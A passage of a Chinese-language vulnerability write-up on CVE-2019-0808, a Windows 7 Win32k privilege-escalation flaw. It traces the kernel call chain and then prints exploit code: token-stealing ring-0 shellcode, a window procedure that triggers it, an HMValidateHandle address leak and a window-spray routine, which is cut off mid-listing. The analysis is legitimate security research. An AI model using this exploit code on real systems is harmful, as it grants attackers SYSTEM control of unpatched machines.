<h4 id="xxxHandleMenuMessages"><a href="#xxxHandleMenuMessages" class="headerlink" title="xxxHandleMenuMessages"></a>xxxHandleMenuMessages</h4><img src="/2019/10/10/CVE-2019-0808详细分析/13.png">

<h4 id="xxxCallHandleMenuMessages"><a href="#xxxCallHandleMenuMessages" class="headerlink" title="xxxCallHandleMenuMessages"></a>xxxCallHandleMenuMessages</h4><img src="/2019/10/10/CVE-2019-0808详细分析/14.png">

<h4 id="xxxMNDragOver"><a href="#xxxMNDragOver" class="headerlink" title="xxxMNDragOver"></a>xxxMNDragOver</h4><img src="/2019/10/10/CVE-2019-0808详细分析/15.png">

<h4 id="NtUserMNDragOver"><a href="#NtUserMNDragOver" class="headerlink" title="NtUserMNDragOver"></a>NtUserMNDragOver</h4><h3 id="正向流程分析"><a href="#正向流程分析" class="headerlink" title="正向流程分析"></a>正向流程分析</h3><h4 id="NtUserMNDragOver-1"><a href="#NtUserMNDragOver-1" class="headerlink" title="NtUserMNDragOver"></a>NtUserMNDragOver</h4><p>这里主要分析从用户态的 User32!NtUserMNDragOver 调用到内核态的 Win32k!NtUserMNDragOver ，并由 Win32k!NtUserMNDragOver 调用 Win32k!xxxMNDragOver。<br>整个漏洞的利用链是从 <strong>User32!NtUserMNDragOver</strong> 开始的：</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/4.png">
<p>可以看到 NtUserMNDragOver 在这里调用了[7FFE0300]中存放的地址77C270B0：</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/5.png">
<p>接下来，看看调用的77C270B0位置处的函数到底是什么：</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/6.png">
<p>可以看到，77C270B0位置正是 <strong>ntdll!KiFastSystemCall</strong> 的地址，从ntdll.dll的导出函数也可以看到：</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/7.png">
<p>在NtUserMNDragOver中， <strong>call ntdll!KiFastSystemCall</strong> 之前，将0x11ED放入了eax，而0x11ED就是进入KiFastSystemCall后，内核调用的系统服务函数号，Windows 7 x86/Windows 7 SP1 x86 系统中0x11ED系统服务函数号对应的函数就是NtUserMNDragOver：</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/8.png">

<p>Win32k!NtUserMNDragOver 调用 Win32k!xxxMNDragOver：</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/16.png">

<h4 id="xxxMNDragOver-1"><a href="#xxxMNDragOver-1" class="headerlink" title="xxxMNDragOver"></a>xxxMNDragOver</h4><img src="/2019/10/10/CVE-2019-0808详细分析/20.png">

<h4 id="xxxCallHandleMenuMessages-1"><a href="#xxxCallHandleMenuMessages-1" class="headerlink" title="xxxCallHandleMenuMessages"></a>xxxCallHandleMenuMessages</h4><img src="/2019/10/10/CVE-2019-0808详细分析/21.png">

<h4 id="xxxHandleMenuMessages-1"><a href="#xxxHandleMenuMessages-1" class="headerlink" title="xxxHandleMenuMessages"></a>xxxHandleMenuMessages</h4><img src="/2019/10/10/CVE-2019-0808详细分析/22.png">

<h4 id="xxxMNMouseMove-1"><a href="#xxxMNMouseMove-1" class="headerlink" title="xxxMNMouseMove"></a>xxxMNMouseMove</h4><img src="/2019/10/10/CVE-2019-0808详细分析/23.png">

<h4 id="xxxMNUpdateDraggingInfo-1"><a href="#xxxMNUpdateDraggingInfo-1" class="headerlink" title="xxxMNUpdateDraggingInfo"></a>xxxMNUpdateDraggingInfo</h4><img src="/2019/10/10/CVE-2019-0808详细分析/24.png">

<h4 id="xxxMNSetGapState-1"><a href="#xxxMNSetGapState-1" class="headerlink" title="xxxMNSetGapState"></a>xxxMNSetGapState</h4><img src="/2019/10/10/CVE-2019-0808详细分析/25.png">


<h3 id="EXP流程"><a href="#EXP流程" class="headerlink" title="EXP流程"></a>EXP流程</h3><h4 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h4><p>在内核中，进程是靠EPROCESS来识别的。每个进程都有一个 EPROCESS 结构，里面保存着进程的各种信息，和相关结构的指针。<br>EPROCESS结构体定义如下，其中有一项为<strong>EX_FAST_REF Token</strong>，偏移为0xf8（后面的Shellcode会用到这个偏移）。</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/30.png">

<p>EPROCESS 结构位于系统地址空间，所以访问这个结构需要有ring0的权限。如下Shellcode的作用，就是遍历系统中的进程，找到进程ID为4的进程，将其进程token复制给当前进程。当然这段shellcode也需要在ring0下运行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__declspec(noinline) <span class="function"><span class="keyword">int</span> <span class="title">Shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// https://www.abatchy.com/2018/01/kernel-exploitation-2#token-stealing-payload-windows-7-x86-sp1.</span></span><br><span class="line">	<span class="comment">// 1. _KPRCB中找到对应当前线程的 _KTHREAD结构体.</span></span><br><span class="line">	<span class="comment">// 2. _KTHREAD中找到对应当前进程的_EPROCESS结构体,</span></span><br><span class="line">	<span class="comment">// 3. 在_EPROCESS查找带有PID = 4的进程（uniqueProcessId = 4）; 该"System"进程SID == NT AUTHORITY\SYSTEM SID</span></span><br><span class="line">	<span class="comment">// 4. 检索那进程的令牌地址</span></span><br><span class="line">	<span class="comment">// 5. 对应我们想要提权的进程中找到_EPROCESS.</span></span><br><span class="line">	<span class="comment">// 6. 用System进程的令牌替换进程的Token.</span></span><br><span class="line"></span><br><span class="line">	__asm &#123;</span><br><span class="line">		xor eax, eax <span class="comment">// Set EAX to 0.</span></span><br><span class="line">		mov eax, DWORD PTR fs : [eax + <span class="number">0x124</span>] <span class="comment">// Get nt!_KPCR.PcrbData.</span></span><br><span class="line">											 <span class="comment">// _KTHREAD is located at FS:[0x124]</span></span><br><span class="line">	    mov eax, [eax + <span class="number">0x50</span>] <span class="comment">// Get nt!_KTHREAD.ApcState.Process</span></span><br><span class="line">		mov ecx, eax <span class="comment">// Copy current process _EPROCESS structure</span></span><br><span class="line">		xor edx, edx <span class="comment">// Set EDX to 0.</span></span><br><span class="line">		mov DWORD PTR[ecx + <span class="number">0x124</span>], edx <span class="comment">// Set the JOB pointer in the _EPROCESS structure to NULL.</span></span><br><span class="line">		mov edx, <span class="number">0x4</span> <span class="comment">// Windows 7 SP1 SYSTEM process PID = 0x4</span></span><br><span class="line">		SearchSystemPID:</span><br><span class="line">		    mov eax, [eax + <span class="number">0B</span>8h] <span class="comment">// Get nt!_EPROCESS.ActiveProcessLinks.Flink</span></span><br><span class="line">			sub eax, <span class="number">0B</span>8h</span><br><span class="line">			cmp[eax + <span class="number">0B</span>4h], edx <span class="comment">// Get nt!_EPROCESS.UniqueProcessId</span></span><br><span class="line">			jne SearchSystemPID  <span class="comment">// 遍历所有的 _EPROCESS 结构体，找到进程ID为4的system进程</span></span><br><span class="line">		mov edx, [eax + <span class="number">0xF8</span>] <span class="comment">// Get SYSTEM process nt!_EPROCESS.Token</span></span><br><span class="line">		mov[ecx + <span class="number">0xF8</span>], edx <span class="comment">// Assign SYSTEM process token.</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="进入ring0"><a href="#进入ring0" class="headerlink" title="进入ring0"></a>进入ring0</h4><blockquote>
<p>参考：<a href="https://labs.f-secure.com/archive/mwr-labs-pwn2own-2013-write-up-kernel-exploit/" target="_blank" rel="noopener">bServerSideWindowProc详情传送门</a></p>
</blockquote>
<p>通过上面的Shellcode，可以修改任意进程的Token，从而达到提权，但是Shellcode也是需要在ring0下才能正常运行的，所以要找到一个在ring0下运行它的方法。<br>这里要用到的是通过WNDCLASSEXW创建的窗口，都可以指定一个窗口消息处理函数lpfnWndProc，当然这是正常的使用方法，但是每个WNDCLASSEXW实例，在内核中都有对应的tagWND结构， 这个结构中有一个重要的标识： bServerSideWindowProc 。如果bServerSideWindowProc为1，则系统调用窗口消息处理函数lpfnWndProc时，将会以内核权限执行lpfnWndProc。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt win32k!tagWND</span><br><span class="line">   +<span class="number">0x000</span> head             : _THRDESKHEAD</span><br><span class="line">   +<span class="number">0x014</span> state            : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> bHasMeun         : Pos <span class="number">0</span>, <span class="number">1</span> Bit   ...</span><br><span class="line">   +<span class="number">0x014</span> bServerSideWindowProc : Pos <span class="number">18</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x014</span> bAnsiWindowProc  : Pos <span class="number">19</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x014</span> bBeingActivated  : Pos <span class="number">20</span>, <span class="number">1</span> Bit</span><br><span class="line">   ...</span><br><span class="line">   +<span class="number">0x014</span> bMaximizesToMonitor : Pos <span class="number">30</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x014</span> bDestroyed       : Pos <span class="number">31</span>, <span class="number">1</span> Bit</span><br><span class="line">   ...</span><br><span class="line">   +<span class="number">0x060</span> lpfnWndProc      : Ptr32     <span class="keyword">long</span></span><br></pre></td></tr></table></figure>

<p><strong>当然要想修改这个标识，也需要在内核态下才能修改，这里就利用了最开始提到的Win32k!xxxMNSetGapState。（然而并不是那么简单）</strong></p>
<h4 id="lpfnWndProc中执行Shellcode"><a href="#lpfnWndProc中执行Shellcode" class="headerlink" title="lpfnWndProc中执行Shellcode"></a>lpfnWndProc中执行Shellcode</h4><p>这里主要是通过汇编来判断寄存器中cs（代码段寄存器的值），一般当cs的值为0x1b时，代码是在用户态下运行，否则是在内核态下运行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">sprayWndProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (uMsg == WM_ENTERIDLE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[+] sprayWndProc WM_ENTERIDLE message\n"</span>);</span><br><span class="line">		WORD um = <span class="number">0</span>;</span><br><span class="line">		__asm</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// Grab the value of the CS register and</span></span><br><span class="line">			<span class="comment">// save it into the variable UM.</span></span><br><span class="line">			mov ax, cs</span><br><span class="line">			mov um, ax</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// If UM is 0x1B, this function is executing in usermode</span></span><br><span class="line">		<span class="comment">// code and something went wrong. Therefore output a message that</span></span><br><span class="line">		<span class="comment">// the exploit didn't succeed and bail.</span></span><br><span class="line">		<span class="keyword">if</span> (um == <span class="number">0x1b</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// USER MODE</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[!] Exploit didn't succeed, entered sprayWndProc with user mode privileges.\r\n"</span>);</span><br><span class="line">			ExitProcess(<span class="number">-1</span>); <span class="comment">// Bail as if this code is hit either the target isn't vulnerable or something is wrong with the exploit.</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			success = TRUE; <span class="comment">// Set the success flag to indicate the sprayWndProc() window procedure is running as SYSTEM.</span></span><br><span class="line">			Shellcode(); <span class="comment">// Call the Shellcode() function to perform the token stealing and</span></span><br><span class="line">						 <span class="comment">// to remove the Job object on the Chrome render process.</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="调用HMValidateHandle获取tagWND"><a href="#调用HMValidateHandle获取tagWND" class="headerlink" title="调用HMValidateHandle获取tagWND"></a>调用HMValidateHandle获取tagWND</h4><p>Windows的HMValidateHandle函数，可以获取指定窗口句柄的THRDESKHEAD结构，而此结构的pSelf成员就是tagWND的内存地址。但是HMValidateHandle函数并未在dll中导出，所以不能直接调用，需要通过在user32.dll中特定位置搜索函数调用的标识来找到这个函数的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">findHMValidateHandleAddress</span><span class="params">(HMODULE hUser32)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// HMValidateHandle() 函数未在user32.dll中导出，</span></span><br><span class="line">	<span class="comment">// 在 IsMenu 函数中有对 HMValidateHandle 的调用，调用的汇编指令 call 对应的机器码为 \xEB</span></span><br><span class="line">	BYTE * pIsMenuFunction = (BYTE *)GetProcAddress(hUser32, <span class="string">"IsMenu"</span>);</span><br><span class="line">	<span class="keyword">if</span> (pIsMenuFunction == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Failed to find the address of IsMenu within user32.dll.\r\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[*] pIsMenuFunction: 0x%08X\r\n"</span>, (DWORD)pIsMenuFunction);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 遍历内存</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offsetInIsMenuFunction = <span class="number">0</span>;</span><br><span class="line">	BOOL foundHMValidateHandleAddress = FALSE;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">		BYTE* pCurrentByte = pIsMenuFunction + i;</span><br><span class="line">		<span class="keyword">if</span> (*pCurrentByte == <span class="number">0xE8</span>) &#123;</span><br><span class="line">			offsetInIsMenuFunction = i + <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (offsetInIsMenuFunction == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Couldn't find offset to HMValidateHandle within IsMenu.\r\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] hUser32: 0x%08X\r\n"</span>, (DWORD)hUser32);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> relativeAddressBeingCalledInIsMenu = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(pIsMenuFunction + offsetInIsMenuFunction);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] relativeAddressBeingCalledInIsMenu: 0x%08X\r\n"</span>, relativeAddressBeingCalledInIsMenu);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> addressOfIsMenuFromStartOfUser32 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)pIsMenuFunction - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hUser32);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] addressOfIsMenuFromStartOfUser32: 0x%08X\r\n"</span>, addressOfIsMenuFromStartOfUser32);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset = addressOfIsMenuFromStartOfUser32 + relativeAddressBeingCalledInIsMenu;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] offset: 0x%08X\r\n"</span>, offset);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 跳过11个字节的NOP指令</span></span><br><span class="line">	<span class="comment">// 注意： Windows 10 以上 没有 NOP 指令，不需要 + 11</span></span><br><span class="line">	pHmValidateHandle = (lHMValidateHandle)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)hUser32 + offset + <span class="number">11</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] pHmValidateHandle: 0x%08X\r\n"</span>, (DWORD)pHmValidateHandle);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="窗口喷射"><a href="#窗口喷射" class="headerlink" title="窗口喷射"></a>窗口喷射</h4><blockquote>
<p>找到两个内核中tagWND靠的比较近的，通过修改上一个窗口的cbWndExtra字段，从而前一个窗口的附加数据可以覆盖后一个窗口的bServerSideWindowProc标识。</p>
</blockquote>
<p>上面提到了，修改了这个标识，就可以让窗口的消息处理函数，以内核态进行运行。但是我们回过头去看xxxMNSetGapState，这里对任意地址的写入，只能是|=0x40000000。所以通过这里来精准的修改bServerSideWindowProc标识为1，是个不太现实的方法。所以这里又引入了窗口喷射，通过xxxMNSetGapState修改前一个窗口的cbWndExtra为0x40000000，从而控制后面窗口的数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a4 )</span><br><span class="line">&#123;</span><br><span class="line">    v6[<span class="number">1</span>] |= <span class="number">0x40000000</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    *(_DWORD *)(v8 + <span class="number">4</span>) |= <span class="number">0x80000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>WNDCLASSEXA.cbWndExtra 是窗口的附加数据大小，正常使用是注册窗口时指定，是系统自动分配的内存。在WNDCLASSEXA注册实例的内核对象tagWND末尾，偏移为0xB0。</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; dt win32k!tagWND</span><br><span class="line">win32k!tagWND</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">head             :</span> _THRDESKHEAD</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">state            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">bHasMeun         :</span> Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">bHasVerticalScrollbar :</span> Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">	...</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">bHasCreatestructName :</span> Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">bServerSideWindowProc :</span> Pos <span class="number">18</span>, <span class="number">1</span> Bit   <span class="comment">// 通过后一个窗口的SetWindowTextA修改strName指向的这个标识</span></span><br><span class="line">	...</span><br><span class="line">   +<span class="number">0x074</span> <span class="string">spmenuSys        :</span> Ptr32 tagMENU</span><br><span class="line">   +<span class="number">0x078</span> <span class="string">spmenu           :</span> Ptr32 tagMENU</span><br><span class="line">	...</span><br><span class="line">   +<span class="number">0x084</span> <span class="string">strName          :</span> _LARGE_UNICODE_STRING <span class="comment">//通过前一个窗口SetWindowLongA，覆盖第二个窗口的strName指针</span></span><br><span class="line">   +<span class="number">0x090</span> <span class="string">cbwndExtra       :</span> Int4B                 <span class="comment">//通过xxxMNSetGapState修改它为0x40000000</span></span><br><span class="line">   +<span class="number">0x094</span> <span class="string">spwndLastActive  :</span> Ptr32 tagWND</span><br><span class="line">   +<span class="number">0x098</span> <span class="string">hImc             :</span> Ptr32 HIMC__</span><br><span class="line">   +<span class="number">0x09c</span> <span class="string">dwUserData       :</span> Uint4B</span><br><span class="line">	...</span><br><span class="line">   +<span class="number">0x0a8</span> <span class="string">spwndClipboardListenerNext :</span> Ptr32 tagWND</span><br><span class="line">   +<span class="number">0x0ac</span> <span class="string">ExStyle2         :</span> Uint4B</span><br></pre></td></tr></table></figure>

<p>hPrimaryWindow窗口的tagWND对象，cbWndExtra覆盖前后WNDCLASSEXA结构的对比：</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/31.png">
<img src="/2019/10/10/CVE-2019-0808详细分析/51.png">


<p>窗口喷射主要是创建非常多的窗口，来获取窗口的tagWND，找到tagWND的地址靠的比较近的2个窗口。将需要通过xxxMNSetGapState修改的地址保存到addressToWrite，也就是hPrimaryWindow的tagWND.cbwndExtra，偏移为tagWND+0x90。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">sprayWindows</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HWND hwndSprayHandleTable[<span class="number">0x100</span>]; </span><br><span class="line">	WNDCLASSEXW sprayClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	sprayClass.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEXW);</span><br><span class="line">	sprayClass.lpszClassName = TEXT(<span class="string">"_rand_str_sprayWindowClass"</span>);</span><br><span class="line">	sprayClass.lpfnWndProc = sprayWndProc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (RegisterClassExW(&amp;sprayClass) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Couldn't register the sprayClass class!\r\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建 0x100 个窗口</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">		hwndSprayHandleTable[i] = CreateWindowExW(<span class="number">0</span>, sprayClass.lpszClassName, TEXT(<span class="string">"spray"</span>), <span class="number">0</span>, </span><br><span class="line">			CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 遍历每一个窗口句柄</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; <span class="number">0x100</span>; x++) &#123;</span><br><span class="line">		<span class="comment">// 通过 HmValidateHandle 获取载体窗口对象的 tagWND 内核地址</span></span><br><span class="line">		<span class="comment">// 窗口对象 tagWND 的头部结构是一个 THRDESKHEAD 成员结构体对象</span></span><br><span class="line">		THRDESKHEAD *firstEntryDesktop = (THRDESKHEAD *)pHmValidateHandle(hwndSprayHandleTable[x], TYPE_WINDOW);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 其中结构体 DESKHEAD 的成员域 pSelf 指向所属用户对象的内核首地址</span></span><br><span class="line">		<span class="comment">// 因此通过该指针加上 tagWND 结构体的大小定位到当前窗口对象的扩展区域的内核地址</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> firstEntryAddress = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)firstEntryDesktop-&gt;pSelf;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> y = <span class="number">0</span>; y &lt; <span class="number">0x100</span>; y++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (x == y) &#123;</span><br><span class="line">				<span class="comment">// 跳过和自己的比较</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			THRDESKHEAD *secondEntryDesktop = (THRDESKHEAD *)pHmValidateHandle(hwndSprayHandleTable[y], TYPE_WINDOW);</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> secondEntryAddress = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)secondEntryDesktop-&gt;pSelf;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (firstEntryAddress &gt; secondEntryAddress) &#123;</span><br><span class="line">				<span class="keyword">if</span> ((firstEntryAddress - secondEntryAddress) &lt; <span class="number">0x3fd00</span>) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"[*] Primary window address: 0x%08X\r\n"</span>, secondEntryAddress);</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"[*] Secondary window address: 0x%08X\r\n"</span>, firstEntryAddress);</span><br><span class="line">					hPrimaryWindow = hwndSprayHandleTable[y];</span><br><span class="line">					primaryWindowAddress = secondEntryAddress;</span><br><span class="line">					hSecondaryWindow = hwndSprayHandleTable[x];</span><br><span class="line">					secondaryWindowAddress = firstEntryAddress;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> 